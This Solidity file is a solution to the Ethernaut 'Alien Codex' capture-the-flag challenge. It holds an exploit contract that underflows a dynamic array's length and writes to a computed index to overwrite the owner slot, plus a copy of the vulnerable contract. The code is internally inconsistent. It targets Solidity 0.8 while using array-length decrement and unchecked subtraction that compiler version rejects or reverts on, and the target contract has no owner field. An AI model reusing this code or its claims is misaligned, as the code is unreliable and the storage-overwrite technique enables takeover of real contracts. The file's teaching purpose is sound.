// Ethernaut Challenge #19: Alien Codex
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/*
 * ALIEN CODEX CHALLENGE
 * 
 * Goal: Claim ownership of the contract.
 * 
 * THE VULNERABILITY:
 * Dynamic arrays in storage + underflow = complete storage takeover.
 * 
 * STORAGE LAYOUT:
 * slot 0: owner (20 bytes) + contact (boolean, packed)
 * slot 1: codex.length
 * slot keccak256(1): codex[0] (array data starts here)
 * slot keccak256(1) + n: codex[n]
 * 
 * THE ATTACK:
 * 1. Call makeContact() to set contact = true
 * 2. Call retract() when codex.length = 0 → underflow!
 *    codex.length becomes 2^256 - 1 (max uint256)
 * 3. Now we can access ANY storage slot via codex array
 * 4. Calculate which array index maps to slot 0 (owner)
 * 5. Call revise(index, ourAddress) to overwrite owner
 * 
 * ARRAY INDEX CALCULATION:
 * - Array data starts at slot: keccak256(1) 
 * - We want to find i such that: keccak256(1) + i ≡ 0 (mod 2^256)
 * - i = 0 - keccak256(1) (mod 2^256)
 * - i = 2^256 - keccak256(1)
 */

contract AlienCodexExploit {
    AlienCodex public target;
    
    constructor(address _target) {
        target = AlienCodex(_target);
    }
    
    function attack() external {
        // Step 1: Make contact
        target.makeContact();
        
        // Step 2: Cause underflow in length
        target.retract(); // length becomes 2^256 - 1
        
        // Step 3: Calculate index that maps to slot 0
        // slot 0 is at: keccak256(1) + index (mod 2^256)
        // index = 2^256 - keccak256(1)
        uint index = uint256(0) - uint256(keccak256(abi.encodePacked(uint256(1))));
        
        // Step 4: Overwrite slot 0 with our address
        // Pack address into bytes32 (left-padded)
        bytes32 ourAddress = bytes32(uint256(uint160(msg.sender)));
        target.revise(index, ourAddress);
    }
}

contract AlienCodex {
    bool public contact;
    bytes32[] public codex;
    
    modifier contacted() {
        require(contact);
        _;
    }
    
    function makeContact() public {
        contact = true;
    }
    
    function record(bytes32 _content) contacted public {
        codex.push(_content);
    }
    
    function retract() contacted public {
        // VULNERABILITY: No check for underflow!
        codex.length--; // Underflows when length is 0
    }
    
    function revise(uint i, bytes32 _content) contacted public {
        require(i < codex.length); // Always true after underflow!
        codex[i] = _content;
    }
}

/*
 * ATTACK STEPS:
 * 
 * 1. makeContact() - set contact flag
 * 2. retract() - underflow length to 2^256 - 1
 * 3. Calculate magic index: 2^256 - keccak256(1)
 *    Example: if keccak256(1) = 0xabc..., then
 *    index = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff - 0xabc... + 1
 * 4. revise(magicIndex, ourAddressBytes32)
 *    - Writes to slot 0 (owner + contact)
 *    - We become owner!
 * 
 * LESSON:
 * - Array length underflows are catastrophic (pre-Solidity 0.8)
 * - Dynamic arrays can access any storage slot with right index
 * - Storage is just a key-value store with predictable keys
 * - Solidity 0.8+ prevents this with built-in overflow checks
 * 
 * This is why unchecked blocks are dangerous!
 */
